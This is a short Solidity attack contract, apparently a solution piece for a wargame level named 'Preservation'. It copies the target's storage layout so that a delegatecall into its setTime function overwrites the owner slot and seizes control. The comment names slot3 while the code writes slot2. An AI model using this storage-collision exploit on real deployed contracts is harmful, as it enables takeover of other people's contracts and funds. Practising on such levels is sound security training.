// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackPreservation {
    uint256 slot0;
    uint256 slot1;
    uint256 slot2;

    // set slot3 to our address
    function setTime(uint256 owner) public {
        slot2 = owner;
    }
}
